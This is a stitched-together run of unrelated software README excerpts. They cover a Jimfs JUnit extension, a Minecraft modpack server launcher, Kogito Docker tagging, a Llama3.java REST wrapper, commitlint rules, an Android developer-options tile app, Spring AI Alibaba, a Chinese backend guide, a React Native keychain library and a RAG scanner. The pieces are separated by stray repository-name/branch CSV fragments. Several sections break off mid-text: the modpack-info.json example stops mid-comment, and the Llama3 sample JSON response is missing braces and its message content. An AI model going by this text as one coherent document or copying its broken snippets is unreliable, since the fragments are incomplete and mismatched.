Jimfs JUnit Jupiter is based on JUnit Jupiter 5, thus requiring at least Java 8.

Compatibility is guaranteed only with the JUnit Jupiter versions from 5.10 to the latest.

## Getting Started

### Maven

```xml
<dependency>
  <groupId>io.github.scordio</groupId>
  <artifactId>jimfs-junit-jupiter</artifactId>
  <version>${jimfs-junit-jupiter.version}</version>
  <scope>test</scope>
</dependency>
```

### Gradle

```kotlin
testImplementation(""io.github.scordio:jimfs-junit-jupiter:${jimfsJunitJupiterVersion}"")
```

### JimfsTempDirFactory

The simplest usage is to set the
[`factory`](https://junit.org/junit5/docs/current/api/org.junit.jupiter.api/org/junit/jupiter/api/io/TempDir.html#factory())
attribute of `@TempDir` to `JimfsTempDirFactory`:

```java
@Test
void test(@TempDir(factory = JimfsTempDirFactory.class) Path tempDir) {
  assertThat(tempDir.getFileSystem().provider().getScheme()).isEqualTo(""jimfs"");
}
```

`tempDir` is resolved into an in-memory temporary directory based on Jimfs, appropriately configured for the current
platform.

### @JimfsTempDir

`@JimfsTempDir`, a `@TempDir`
[composed annotation](https://junit.org/junit5/docs/current/user-guide/#writing-tests-meta-annotations),
can be used as a drop-in replacement for `@TempDir(factory = JimfsTempDirFactory.class)`:

```java
@Test
void test(@JimfsTempDir Path tempDir) {
  assertThat(tempDir.getFileSystem().provider().getScheme()).isEqualTo(""jimfs"");
}
```

The default behavior of the annotation is equivalent to using `JimfsTempDirFactory` directly:
`tempDir` is resolved into an in-memory temporary directory based on Jimfs, appropriately configured for the current
platform.

For better control over the underlying in-memory file system, `@JimfsTempDir` offers an optional `value` attribute
that can be set to the desired configuration, one of:
* `DEFAULT`: based on the corresponding [configuration parameter](#default-jimfs-configuration) (default)
* `FOR_CURRENT_PLATFORM`: appropriate to the current platform
* `OS_X`: for a Mac OS X-like file system
* `UNIX`: for a UNIX-like file system
* `WINDOWS`: for a Windows-like file system

For example, the following defines a Windows-like temporary directory regardless of the platform the test
is running on:

```java
@Test
void test(@JimfsTempDir(WINDOWS) Path tempDir) {
  assertThat(tempDir.getFileSystem().getSeparator()).isEqualTo(""\\"");
}
```

### Configuration Parameters

Jimfs JUnit Jupiter supports JUnit
[configuration parameters](https://junit.org/junit5/docs/current/user-guide/#running-tests-config-params).

#### Default `@TempDir` Factory

The `junit.jupiter.tempdir.factory.default` configuration parameter sets the default factory to use, expecting its
fully qualified class name.

For example, the following configures `JimfsTempDirFactory`:

```properties
junit.jupiter.tempdir.factory.default=io.github.scordio.jimfs.junit.jupiter.JimfsTempDirFactory
```

The factory will be used for all `@TempDir` annotations unless the `factory` attribute of the annotation
specifies a different type.

#### Default Jimfs Configuration

The `jimfs.junit.jupiter.tempdir.configuration.default` configuration parameter sets the default Jimfs configuration
to use, expecting one of the following (case-insensitive):
* `FOR_CURRENT_PLATFORM`: appropriate to the current platform (default)
* `OS_X`: for a Mac OS X-like file system
* `UNIX`: for a UNIX-like file system
* `WINDOWS`: for a Windows-like file system

For example, the following defines a Windows-like temporary directory regardless of the platform the test
is running on:

```properties
jimfs.junit.jupiter.tempdir.configuration.default=windows
```

All Jimfs-based temporary directories will be configured accordingly unless `@JimfsTempDir` is used and
its `value` attribute is set.

### Limitations

Jimfs JUnit Jupiter only supports annotated fields or parameters of type `Path`, as Jimfs is a non-default file
system and `File` instances can only be associated with the default file system.

## Improvements

Compared to the configuration options that Jimfs provides, Jimfs JUnit Jupiter exposes a much smaller surface to keep
its usage simple.

In case something is missing for your use case, please [raise an issue](../../issues/new)!

Patbox/mrpack4server,master,"# mrpack4server
mrpack4server is a ""server launcher"" that allows you to easily install and run any modpack from Modrinth
(or one that's exported in `.mrpack` format) as a Minecraft Server on your local machine or any hosting provider that supports custom jars.
This tool doesn't require any additional arguments and can work as any other server jar (like vanilla provided one).

## Features:
- For any users, usable standalone, for setup of any modpack by defining a single file.
- For modpack makers, allowing quick server setup by having to just download and run a single file.
- Automatically downloads required mrpack files and any mods / external assets defined by modpack.
- Automatically downloads and starts the server/modloader files, without requiring renaming of jars, supporting Fabric Loader, 
Quilt Loader, Forge and NeoForge.
If used with modpack for other unsupported platforms, it will still install everything, but won't be able to launch.

## Usage:
The file is run just like any other Minecraft server (`java -jar mrpack4server.jar`) and will use / pass
through any arguments given to it. When used on its own, it looks in 3 places for modpack definition
with provided order:
- `modpack-info.json` within jar itself, useful for modpack makers. See below for definition,
- `modpack-info.json` within server's root directory, for users to simple setup,
- `local.mrpack` within server's root directory, making it directly use provided mrpack file instead of 
pulling it from Modrinth.

If neither of these is found, it will ask you to either provide link, project id or name of the modpack you want to install
and then the version of it (suggesting latest one), which will be used to create local `modpack-info.json` file. 
You can then either update target version by editing it or by removing the file and rerunning the initial setup.

Default/main jar only supports Java 21 (`mrpack4server-X.Y.Z.jar`). If you want to run it on older Java version you can use:
- `mrpack4server-X.Y.Z-jvm8.jar` for Java 8 and above,
- `mrpack4server-X.Y.Z-jvm16.jar` for Java 16 and above,
- `mrpack4server-X.Y.Z-jvm17.jar` for Java 17 and above.

These versions however don't override requirements of Minecraft/Loader itself. 
For example, you still need Java to use Java 17 or above to run Minecraft 1.20.1 and Java 8 (but not newer!) to run Forge 1.16.5.

You can create bundled variant by hand or by running `java -cp mrpack4server.jar eu.pb4.mrpackserver.Create`.
By default, without any arguments, it will copy currently provided `modpack-info.json` file, but you can also set it with arguments (`--arg value`),
where it mirrors all arguments from `modpack-info.json` (aka `--project_id my_modpack --version_id 1.2.3` will create jar with these defined).
Additionally, you can use the `--out` argument to set output file path, by default being set to `--out server.jar`.

### `modpack-info.json` format:
`modpack-info.json` is a regular json file without support for comments. Ones provided below are purely
to make easier to describe things.
```json5
{
  // (Optional) Display name, used to display as information while starting / download files.
  ""display_name"": ""My Modpack"",
  // (Optional) Display version, used to display as information while starting / download files.
  ""display_version"": ""1.0.0 for 1.21.1"",
  // Project id used on Modrinth and locally, identifying modpack as unique. Can use slug or ID
  ""project_id"": ""my_modpack_by_patbox"",
  // Version id used on Modrinth and locally, identifying used version. Can be a version number, version id or prefixed version type.
  // As version type, you can set it to "";;release"", "";;beta"" or "";;alpha"", making it download latest version with highest

## Caveats

### Docker Image für Kogito Data Index

Die Dev Services von Kogito benötigen das Docker Image `apache/incubator-kie-kogito-data-index-ephemeral:main`. Leider
wird das Image aber nur als `apache/incubator-kie-kogito-data-index-ephemeral:main-$TIMESTAMP` gepusht. Daher muss es
lokal gepullt und umbenannt werden:

    docker pull apache/incubator-kie-kogito-data-index-ephemeral:main-20240818
    docker tag apache/incubator-kie-kogito-data-index-ephemeral:main-20240818 apache/incubator-kie-kogito-data-index-ephemeral:main

Die jeweils aktuelle Version mit dem aktuellen Tag findet man
unter [hub.docker.com/r/apache/incubator-kie-kogito-data-index-ephemeral/tags](https://hub.docker.com/r/apache/incubator-kie-kogito-data-index-ephemeral/tags).

stephanj/Llama3JavaChatCompletionService,master,"# Llama3.java Inference with OpenAI Chat Completion REST API ☕️

This project provides a REST API wrapper for the amazing [Llama3.java project](https://github.com/mukel/llama3.java) from Alfonso² Peterssen. 
The wrapper is compliant with the OpenAI API specification for chat completions.

## ToDo 

- [X] SpringBoot wrapper around Llama3.java
- [X] Create Java Flame graph to see where performance issue's are located (matmul 🔥)
- [ ] Optional: Quarkus wrapper around Llama3.java
- [ ] TornadoVM enabled version
- [ ] GraalVM native version
- [ ] LLM Sharding (Layers, Attn Head)
- [ ] BitNets support 
- [ ] Ternary Models support

## On Apple Silicon (M1/M2/M3)

Make sure to download an ARM compliant SDK, for example from https://bell-sw.com/pages/downloads/#jdk-21-lts 

https://github.com/user-attachments/assets/6fecb9c1-6c84-4a01-a63b-272e75009618

## Setup

Set the JAVA_HOME environment variable to the ARM SDK path. 

Example with Zulu JDK 23 (zulu23.30.13-ca-jdk23.0.1-macosx_aarch64)

```bash
export JAVA_HOME=/Library/Java/JavaVirtualMachines/zulu-23.jdk/Contents/Home
```

IMPORTANT: Do not use SDKMan because this will fall back to the x86 version of the SDK.

## Build 

```bash
mvn clean package
```

## Download LLM

Download a GGUF model from the Hugging Face model hub and place it in the 'models' directory. 
For example:

```bash
mkdir models 
cd models
curl https://huggingface.co/hugging-quants/Llama-3.2-1B-Instruct-Q8_0-GGUF/blob/main/llama-3.2-1b-instruct-q8_0.gguf
```

Update the 'llama.model.name' variable in the application.properties file if you use a different model.

```application.properties
spring.application.name=Llama3.java Server
server.servlet.context-path=/

llama.model.path=models
llama.model.name=Meta-Llama-3.2-1b-instruct-Q8_0.gguf

logging.level.com.llama4j=INFO

server.address=localhost
server.port=8080
```

## Run 

Start the Spring Boot app which holds the Llama3.java REST wrapper as follows:

```bash
java --add-modules jdk.incubator.vector --enable-preview -jar target/llama3-server-1.0.0-SNAPSHOT.jar
```

or use the run.sh script which sets some extra JVM GC and Heap settings

```bash
./run.sh
```

## Test using Curl

```bash
curl -X POST http://localhost:8080/chat/completions \
-H ""Content-Type: application/json"" \
-d '{
  ""messages"": [
    {
      ""role"": ""system"",
      ""content"": ""You are a comedian.""
    },
    {
      ""role"": ""user"",
      ""content"": ""Tell me a joke.""
    }
  ],
  ""temperature"": 0.7,
  ""top_p"": 0.95,
  ""max_tokens"": 100
}'
```

Response

```json

   ""id"":""chatcmpl-1"",
   ""object"":""chat.completion"",
   ""created"":1729447400,
   ""model"":""Meta-Llama-3.2-1b-instruct-Q8_0.gguf"",

         },
         ""logprobs"":null,
         ""finishReason"":""stop""
      }
   ],
   ""usage"":{

      ""totalTokens"":78,
      ""completionTokensDetails"":{
         ""reasoningTokens"":0
      }
   }
```

## Test using DevoxxGenie 

Launch any JetBrains IDE (such as IDEA, CLion, WebStorm, etc.) and install '[DevoxxGenie](https://plugins.jetbrains.com/plugin/24169-devoxxgenie)' from the Plugins marketplace. 
You can then choose either 'Jlama (Experimental)' or 'Exo (Experimental)', both of which utilize OpenAI's Chat Completion.

Next, enter a prompt and optionally attach files to the window context by using the 'Add File' icon located below the prompt text area.

Example with file attachment in prompt context:

### Key Findings by ChatGPT

This profiling trace shows a CPU-heavy Java application, likely dealing with machine learning or vectorized computation. Here's a breakdown of key components:

1. **Heavy CPU Usage (`java.util.concurrent.ForkJoinWorkerThread.run`) at 86%**
   - This is likely a thread-pool executor used for parallelizing tasks. It suggests significant multi-threaded execution, possibly parallelized matrix operations or tensor calculations.

2. **`com.llama4j.core.FloatTensor$$Lambda.accept` (61.5%)**
   - This method involves processing a tensor's float data. Lambda expressions in Java are anonymous functions, often used for concise representations of callbacks or functional programming.

3. **`jdk.incubator.vector.FloatVector.reduceLanes` (49.5%)**
   - Indicates vectorized computation involving float vectors. This uses the Vector API from the JDK's incubator module, designed to perform operations on wide vectors leveraging CPU SIMD (Single Instruction, Multiple Data) capabilities.

4. **`com.llama4j.core.ArrayFloatTensor.getFloatVector` (7.7%)**
   - Suggests fetching float vectors from an array-based tensor representation. This could be another bottleneck related to memory access when performing operations.

5. **`com.llama4j.web.rest.LlamaWrapperApplication.chatCompletions` (13.9%)**
   - Indicates that part of the time is spent processing chat completion requests, suggesting this application is likely an LLM interface or chatbot.

6. **`com.llama4j.core.FloatTensor.matmul` (12.0%)**
   - This is the matrix multiplication function, which contributes to the linear algebra operations in the application, likely forming the backbone of the model's computations.

### Potential Bottlenecks and Optimization Ideas

- **ForkJoinWorkerThread**: If this thread is consuming 86% of the CPU, there might be room to optimize the parallelization strategy. Investigate if there’s overhead or contention between threads.
- **Vectorization**: The use of `jdk.incubator.vector.FloatVector` shows a good attempt at leveraging vectorized operations, but it may need tuning based on the target CPU’s vector width (e.g., AVX-512 support).
- **Memory Access**: The significant time spent in `ArrayFloatTensor.getFloatVector` could indicate a memory bandwidth bottleneck. This might benefit from optimizing data locality or using more efficient memory layouts (like row-major or column-major order).

---

### Key Findings by Claude

1. **FloatTensor Operations: 61.5% of execution time**

com.llama4j.core.FloatTensor$$Lambda$0x0000000080143b048.accept(int)
Likely the core model inference bottleneck

2. **Vector Operations: 49.5% of execution time**

jdk.incubator.vector.Float128Vector.reduceLanes(VectorOperators$Associative)
Part of the FloatTensor operations

3. **Array Processing: 7.7% of execution time**

com.llama4j.core.ArrayFloatTensor.getFloatVector(VectorSpecies, int)

4. **HTTP Request Handling: 13.9% of execution time**

com.llama4j.web.rest.LlamaWrapperApplication.chatCompletions(ChatCompletionRequest)

#### Recommendations

1. **Optimize Tensor Operations:**

Profile the FloatTensor class to identify specific bottlenecks
Consider using more efficient linear algebra libraries or GPU acceleration
Optimize memory access patterns and data structures

2. **Improve Vector Processing:**

Investigate the use of more efficient vector operations or libraries
Consider using SIMD instructions if not already implemented

3. **Enhance Array Processing:**

Optimize the getFloatVector method in ArrayFloatTensor
Consider using more efficient data structures or access patterns

4. **Optimize HTTP Request Handling:**

Profile the chatCompletions method to identify specific bottlenecks
Consider implementing caching mechanisms or request batching
Optimize data serialization/deserialization if applicable

#### General Optimizations:

- Implement multi-threading for parallel processing where applicable
- Optimize memory usage and garbage collection
- Consider using a more performant JVM or JIT compiler

## How to name a commit message?

**Commitlint** checks if your commit messages meet the [conventional commit format](https://conventionalcommits.org).

Commit message pattern:

```sh
type(scope?): subject  #scope is optional; multiple scopes are supported (current delimiter options: ""/"", ""\"" and "","")
```

Examples:

```text
chore: run tests on travis ci
```

```text
fix(server): send cors headers
```

```text
feat(blog): add comment section
```

Common types according to [commitlint-config-conventional (based on the Angular convention)](https://github.com/conventional-changelog/commitlint/tree/master/@commitlint/config-conventional#type-enum) can be:

- build
- chore
- ci
- docs
- feat
- fix
- perf
- refactor
- revert
- style
- test

Quick Settings tiles for developers

[<img src=""https://f-droid.org/badge/get-it-on.png""
    alt=""Get it on F-Droid""
    height=""80"">](https://f-droid.org/packages/me.velc.devqs)


Tired of banking and other financial apps whining that Developer Options is on? With *DevQS*,
Developer Options can be toggled off then back on from the Quick Settings panel without resetting
other settings. Long-clicking on any of the tiles will also open the Developer Options settings
screen if the DEV toggle is on.

**IMPORTANT:**

There is no launcher icon nor activity. The tiles must be manually added to the Quick Settings panel.
The app requires the permission WRITE_SECURE_SETTINGS which can be granted using ADB.

`adb shell pm grant me.velc.devqs android.permission.WRITE_SECURE_SETTINGS`

Also, the tiles are disabled while on the lock screen and can only be toggled after unlocking the device.
If that is not the case, try allowing auto-start or turning off battery optimizations for the app.
See [dontkillmyapp.com](https://dontkillmyapp.com) for instructions.

alibaba/spring-ai-alibaba,main,"# [Spring AI Alibaba](https://sca.aliyun.com/ai/)

[中文版本](./README-zh.md)

An AI application framework for Java developers built on top of Spring AI that provides seamless integration with Alibaba Cloud QWen LLM services and cloud-native infrastructures.

## Get Started
Please refer to [quick start](https://sca.aliyun.com/ai/get-started/) for how to quickly add generative AI to your Spring Boot applications.

Overall, it takes only two steps to turn your Spring Boot application into an intelligent agent:

> Because Spring AI Alibaba is developed based on Spring Boot 3.x, it requires JDK version 17 and above.

1. Add 'spring-ai-alibaba-starter' dependency to your project.

```xml
<dependency>
	<groupId>com.alibaba.cloud.ai</groupId>
	<artifactId>spring-ai-alibaba-starter</artifactId>
	<version>1.0.0-M3.1</version>
</dependency>
```

> NOTICE! Since spring-ai related packages haven't been published to the central repo yet, it's needed to add the following maven repository to your project in order to successfully resolve artifacts like  spring-ai-core.
>
> ```xml
> <repositories>
> 	<repository>
> 		<id>spring-milestones</id>
> 		<name>Spring Milestones</name>
> 		<url>https://repo.spring.io/milestone</url>
> 		<snapshots>
> 			<enabled>false</enabled>
> 		</snapshots>
> 	</repository>
> </repositories>
> ```
> Addendum: If the mirrorOf tag in your local Maven settings. xml is configured with the wildcard *, please modify it according to the following example.
> ```xml
> <mirror>
>   <id>xxxx</id>
>   <mirrorOf>*,!spring-milestones</mirrorOf>
>   <name>xxxx</name>
>   <url>xxxx</url>
> </mirror>
> ```

2. Inject the default `ChatClient` Bean to regular Controller beans.

```java
@RestController
public class ChatController {

	private final ChatClient chatClient;

	public ChatController(ChatClient.Builder builder) {
		this.chatClient = builder.build();
	}

	@GetMapping(""/chat"")
	public String chat(String input) {
		return this.chatClient.prompt()
				.user(input)
				.call()
				.content();
	}
}
```

## Examples
More examples can be found at [spring-ai-alibaba-examples](./spring-ai-alibaba-examples).

* Hello World
* Chat Model
* Multi Model
* Function Calling
* Structured Output
* Prompt
* RAG
* Flight Booking Playground, an advanced example showcasing usage of prompt template, function calling, chat memory and rag at the same time.

## Core Features

Spring AI Alibaba provides the following features, read the [documentation](https://sca.aliyun.com/ai) on our website for more details of how to use these features.

* Support for Alibaba Cloud QWen Model and Dashscope Model service.
* Support high-level AI agent abstraction -- ChatClient.
* Support various Model types like Chat, Text to Image, Audio Transcription, Text to Speech.
* Both synchronous and stream API options are supported.
* Mapping of AI Model output to POJOs.
* Portable API across Vector Store providers.
* Function calling.
* Spring Boot Auto Configuration and Starters.
* RAG (Retrieval-Augmented Generation) support: DocumentReader, Splitter, Embedding, VectorStore, and Retriever.
* Support conversation with ChatMemory

## Roadmap

Spring AI Alibaba aims to reduce the complexity of building ai native java applications, from development, evaluation to deployment and observability. In order to achieve that, we provide both open-source framework and ecosystem integrations around it, below are the features that we plan to support in the near future:
* Prompt Template Management
* Event Driven AI Application
* Support of more Vector Databases
* Function Deployment
* Observability
* AI proxy support: prompt filtering, rate limit, multiple Model, etc.
* Development Tools

### 前端

**暂无，待后端开发到80%以上后再考虑推进前端开发**

## 开发指南

本项目使用 Java 21 开发。

本项目目前对 [PostgreSQL](https://www.postgresql.org/) 做了完整适配，其他数据库需要做轻微改造才能兼容。

可以使用 [Docker Compose](https://docs.docker.com/compose/) 启动数据库：

```shell
docker compose up -d
```

或者 docker 命令：
`docker run --rm  -p 54324:5432 -e POSTGRES_PASSWORD=muyun2024 -e POSTGRES_DB=muyun  postgres:17-alpine`

后端开发环境启动：

```shell
./gradlew --console=plain :muyun-boot:quarkusDev
```

## Installation

1. Run `yarn add react-native-keychain-manager`

   1 a. **Only for React Native <= 0.59**: `$ react-native link react-native-keychain-manager` and check `MainApplication.java` to verify the package was added. See manual installation below if you have issues with `react-native link`.

2. Run `pod install` in `ios/` directory to install iOS dependencies.
3. If you want to support FaceID, add a `NSFaceIDUsageDescription` entry in your `Info.plist`.
4. Re-build your Android and iOS projects.

## Usage

```js
import * as Keychain from 'react-native-keychain-manager';

async () => {
  const username = 'zuck';
  const password = 'poniesRgr8';

  // Store the credentials
  await Keychain.setGenericPassword(username, password);

  try {
    // Retrieve the credentials
    const credentials = await Keychain.getGenericPassword();
    if (credentials) {
      console.log(
        'Credentials successfully loaded for user ' + credentials.username
      );
    } else {
      console.log('No credentials stored');
    }
  } catch (error) {
    console.log(""Keychain couldn't be accessed!"", error);
  }
  await Keychain.resetGenericPassword();
};
```

See `KeychainExample` for fully working project example.

Both `setGenericPassword` and `setInternetCredentials` are limited to strings only, so if you need to store objects etc, please use `JSON.stringify`/`JSON.parse` when you store/access it.

## API

### `setGenericPassword(username, password, [{ accessControl, accessible, accessGroup, service, securityLevel }])`

Will store the username/password combination in the secure storage. Resolves to `{service, storage}` or rejects in case of an error. `storage` - is a name of used internal cipher for saving secret; `service` - name used for storing secret in internal storage (empty string resolved to valid default name).

### `hasGenericPassword([{ service }])`

Will check if the username/password combination is available for service in the secure storage. Resolves to `true` if an entry exists or `false` if it doesn't.

### `getGenericPassword([{ authenticationPrompt, service, accessControl }])`

Will retrieve the username/password combination from the secure storage. Resolves to `{ username, password, service, storage }` if an entry exists or `false` if it doesn't. It will reject only if an unexpected error is encountered like lacking entitlements or permission.

### `resetGenericPassword([{ service }])`

Will remove the username/password combination from the secure storage. Resolves to `true` in case of success.

### `getAllGenericPasswordServices()`

Will retrieve all known service names for which a generic password has been stored (e.g., `setGenericPassword`).

_Note_: on iOS this will actully read the encrypted entries, so it will trigger an authentication UI if you have encrypted any entries with password/biometry.

### `setInternetCredentials(server, username, password, [{ accessControl, accessible, accessGroup, securityLevel }])`

Will store the server/username/password combination in the secure storage. Resolves to `{ username, password, service, storage }`;

### `hasInternetCredentials(server)`

Will check if the username/password combination for server is available in the secure storage. Resolves to `true` if an entry exists or `false` if it doesn't.

### `getInternetCredentials(server, [{ authenticationPrompt }])`

Will retrieve the server/username/password combination from the secure storage. Resolves to `{ username, password }` if an entry exists or `false` if it doesn't. It will reject only if an unexpected error is encountered like lacking entitlements or permission.

### `resetInternetCredentials(server)`

Will remove the server/username/password combination from the secure storage.

### `requestSharedWebCredentials()` (iOS and visionOS only)

Asks the user for a shared web credential. Requires additional setup both in the app and server side, see [Apple documentation](https://developer.apple.com/documentation/security/shared_web_credentials). Resolves to `{ server, username, password }` if approved and `false` if denied and throws an error if not supported on platform or there's no shared credentials.

### `setSharedWebCredentials(server, username, password)` (iOS and visionOS only)

Sets a shared web credential. Resolves to `true` when successful.

### `canImplyAuthentication([{ authenticationType }])` (iOS and visionOS only)

Inquire if the type of local authentication policy is supported on this device with the device settings the user chose. Should be used in combination with `accessControl` option in the setter functions. Resolves to `true` if supported.

### `getSupportedBiometryType()`

**On iOS and visionOS:** Get what type of hardware biometry support the device can use for biometric encryption. Resolves to a `Keychain.BIOMETRY_TYPE` value when supported and enrolled, otherwise `null`.

**On Android:** Get what type of Class 3 (strong) biometry support the device has. Resolves to a `Keychain.BIOMETRY_TYPE` value when supported, otherwise `null`. In most devices this will return `FINGERPRINT` (except for Pixel 4 or similar where fingerprint sensor is not present).

> This method returns `null`, if the device haven't enrolled into fingerprint/FaceId. Even though it has hardware for it.

### `getSecurityLevel([{ accessControl }])` (Android only)

Get security level that is supported on the current device with the current OS. Resolves to `Keychain.SECURITY_LEVEL` enum value.

| `AUTOMATIC_UPGRADE` | Upgrade secret to the best available storage as soon as it is available and user request secret extraction. Upgrade not applied till we request the secret. This rule only applies to secrets stored with FacebookConseal. |

## Important Behavior

### Rule 1: Automatic Security Level

As a rule the library will try to apply the best possible encryption for storing secrets. Once the secret is stored however its does not try to upgrade it unless FacebookConseal was used and the option 'SECURITY_RULES' is set to 'AUTOMATIC_UPGRADE'

---

Q: What will happen if user disables/drops biometric usage?

A: User will lose ability to extract secret from storage. On re-enable biometric access to the secret will be possible again.

---

Q: Is it possible to implement automatic downgrading?

A: From security perspective any Automatic downgrading is treated as ""a loss of the trust"" point.
Developer should implement own logic to allow downgrade and deal with ""security loss"". _(My recommendation - never do that!)_

---

Q: How to enable automatic upgrade for FacebookConseal?

A: Do call `getGenericPassword({ ...otherProps, rules: ""AUTOMATIC_UPGRADE"" })` with extra property `rules` set to `AUTOMATIC_UPGRADE` string value.

---

Q: How to force a specific level of encryption during saving the secret?

A: Do call `setGenericPassword({ ...otherProps, storage: ""AES"" })` with forced storage.

> Note: attempt to force storage `RSA` when biometrics is not available will force code to reject call with errors specific to device biometric configuration state.

## Manual Installation

### iOS

#### Option: Manually

- Right click on Libraries, select **Add files to ""…""** and select `node_modules/react-native-keychain-manager/RNKeychainManager.xcodeproj`
- Select your project and under **Build Phases** -> **Link Binary With Libraries**, press the + and select `libRNKeychainManager.a`.
- make sure `pod 'RNKeychainManager'` is not in your `Podfile`

#### Option: With [CocoaPods](https://cocoapods.org/)

Add the following to your `Podfile` and run `pod update`:

```
pod 'RNKeychainManager', :path => '../node_modules/react-native-keychain-manager'
```

#### Enable `Keychain Sharing` entitlement for iOS 10+

For iOS 10 you'll need to enable the `Keychain Sharing` entitlement in the `Capabilities` section of your build target. (See screenshot). Otherwise you'll experience the error shown below.

![screen shot 2016-09-16 at 20 56 33](https://cloud.githubusercontent.com/assets/512692/18597833/15316342-7c50-11e6-92e7-781651e61563.png)

```
Error: {
  code = ""-34018"";
  domain = NSOSStatusErrorDomain;
  message = ""The operation couldn\U2019t be completed. (OSStatus error -34018.)"";
}
```

### Android

#### Option: Manually

- Edit `android/settings.gradle` to look like this (without the +):

```diff
rootProject.name = 'MyApp'

include ':app'

+ include ':react-native-keychain-manager'
+ project(':react-native-keychain-manager').projectDir = new File(rootProject.projectDir, '../node_modules/react-native-keychain-manager/android')
```

- Edit `android/app/build.gradle` (note: **app** folder) to look like this:

```diff
apply plugin: 'com.android.application'

android {
  ...
}

dependencies {
  implementation fileTree(dir: 'libs', include: ['*.jar'])
  implementation 'com.android.support:appcompat-v7:23.0.1'
  implementation 'com.facebook.react:react-native:0.19.+'
+ implementation project(':react-native-keychain-manager')
}
```

- Edit your `MainApplication.java` (deep in `android/app/src/main/java/...`) to look like this (note **two** places to edit):

```diff
package com.myapp;

+ import com.dorianmazur.keychain.KeychainPackage;

....

public class MainActivity extends extends ReactActivity {

  @Override
  protected List<ReactPackage> getPackages() {
      return Arrays.<ReactPackage>asList(
              new MainReactPackage(),
+             new KeychainPackage()
      );
  }
  ...
}
```

#### Proguard Rules

On Android builds that use proguard (like release), you may see the following error:

```
RNKeychainManager: no keychain entry found for service:
JNI DETECTED ERROR IN APPLICATION: JNI FindClass called with pending exception java.lang.NoSuchFieldError: no ""J"" field ""mCtxPtr"" in class ""Lcom/facebook/crypto/cipher/NativeGCMCipher;"" or its superclasses
```

If so, add a proguard rule in `proguard-rules.pro`:

```
-keep class com.facebook.crypto.** {
   *;
}
```

## Unit Testing with Jest

The keychain manager relies on interfacing with the native application itself. As such, it does not successfully compile and run in the context of a Jest test, where there is no underlying app to communicate with. To be able to call the JS functions exposed by this module in a unit test, you should mock them in one of the following two ways:

First, let's create a mock object for the module:

```js
const keychainMock = {
  SECURITY_LEVEL_ANY: ""MOCK_SECURITY_LEVEL_ANY"",
  SECURITY_LEVEL_SECURE_SOFTWARE: ""MOCK_SECURITY_LEVEL_SECURE_SOFTWARE"",
  SECURITY_LEVEL_SECURE_HARDWARE: ""MOCK_SECURITY_LEVEL_SECURE_HARDWARE"",
  setGenericPassword: jest.fn().mockResolvedValue(),
  getGenericPassword: jest.fn().mockResolvedValue(),
  resetGenericPassword: jest.fn().mockResolvedValue(),
  ...
}
```

### Using a Jest `__mocks__` Directory

1. Read the [jest docs](https://jestjs.io/docs/en/manual-mocks#mocking-node-modules) for initial setup

2. Create a `react-native-keychain-manager` folder in the `__mocks__` directory and add `index.js` file in it. It should contain the following code:

```javascript
export default keychainMock;
```

### Using a Jest Setup File

1. In your Jest config, add a reference to a [setup file](https://jestjs.io/docs/en/configuration.html#setupfiles-array)

2. Inside your setup file, set up mocking for this package:

```javascript
jest.mock('react-native-keychain-manager', () => keychainMock);
```

Now your tests should run successfully, though note that writing and reading to the keychain will be effectively a no-op.

## Notes

### Android Notes

The module will automatically use the appropriate CipherStorage implementation based on API level:

- API level 16-22 will en/de crypt using Facebook Conceal
- API level 23+ will en/de crypt using Android Keystore

Encrypted data is stored in DataStore Preferences.

The `setInternetCredentials(server, username, password)` call will be resolved as call to `setGenericPassword(username, password, server)`. Use the `server` argument to distinguish between multiple entries.

#### Configuring the Android-specific behavior

Android implementation has behavioural specifics incurred by existing inconsistency between implementations by different vendors. E.g., some Samsung devices show very slow startup of crypto system. To alleviate this, a warm-up strategy is introduced in Android implementation of this library.

Using default constructor you get default behaviour, i.e. with the warming up on.

```java
    private List<ReactPackage> createPackageList() {
      return Arrays.asList(
        ...
        new KeychainPackage(),  // warming up is ON
        ...
      )

```

Those who want finer control are required to use constructor with a builder which can be configured as they like:

```java
    private List<ReactPackage> createPackageList() {
      return Arrays.asList(
        ...
        new KeychainPackage(
                new KeychainModuleBuilder()
                        .withoutWarmUp()),   // warming up is OFF
        ...
      )
```

### iOS Notes

If you need Keychain Sharing in your iOS extension, make sure you use the same App Group and Keychain Sharing group names in your Main App and your Share Extension. To then share the keychain between the Main App and Share Extension, use the `accessGroup` and `service` option on `setGenericPassword` and `getGenericPassword`, like so: `getGenericPassword({ accessGroup: 'group.appname', service: 'com.example.appname' })`

### Security

On API levels that do not support Android keystore, Facebook Conceal is used to en/decrypt stored data. The encrypted data is then stored in DataStore Preferences. Since Conceal itself stores its encryption key in DataStore Preferences, it follows that if the device is rooted (or if an attacker can somehow access the filesystem), the key can be obtained and the stored data can be decrypted. Therefore, on such a device, the conceal encryption is only an obscurity. On API level 23+ the key is stored in the Android Keystore, which makes the key non-exportable and therefore makes the entire process more secure. Follow best practices and do not store user credentials on a device. Instead use tokens or other forms of authentication and re-ask for user credentials before performing sensitive operations.

=================================================
Aim of the project: A showcase of a RAG scanner written in Java and using [Spring AI](https://docs.spring.io/spring-ai/reference/api/index.html), which scans the targeted documents and you can ask questions to the LLM regarding the given documents.

## Disclaimer
This tool is intended for educational and productivity purposes only. It is designed to assist users in managing and querying their own documents. Any illegal or unethical use of this software is strictly prohibited.

## Requirements
1. [Java 21](https://www.oracle.com/java/technologies/javase/jdk21-archive-downloads.html) installed on your device
2. [Docker](https://www.docker.com/products/docker-desktop/)
3. An environment variable named `GOOGLE_API_KEY` and add your [Google Gemini API key](https://ai.google.dev/gemini-api/docs/api-key)

## Installation
1. Navigate to the project directory
2. Open CMD/Powershell/Terminal
3. For Windows Run `./mvnw clean install`, for Linux/Mac run `./mvn clean install`

## How to use:
1. Run `docker-compose up` in your CMD/Powershell/Terminal
2. Run the project using maven, on Windows: `./mvnw spring-boot:run`, on Linux/Mac run `./mvn spring-boot:run`.
3. When the shell opens type `collection-size 768` (for Gemini `768` is compatible).
4. Place your files in a directory, copy the full path of the directory, and run something like this `load /your/path`, wait till the files are chunked and loaded to `Qdrant vector database`.
5. Finally in the shell write `ask ""your question here""` and that's it.


### Notes
It's a simple project, needs a lot of improvements like: 
1. Improve chunking documents (Currently chunked by token size)
2. Support more file types (Currently supports txt, HTML, JSON, MD, docx, ppt, pdf, and a lot more)
3. Support other Chat models like GPT, Ollama, etc... (currently supports Gemini version `gemini-1.5-flash-latest`, the reason I decided to use Gemini is because it has a good free tier)
4. Support to make it a standalone executable and a jar file, (Currently you can build it yourself and run it, it has no problem, but I will simplify it)
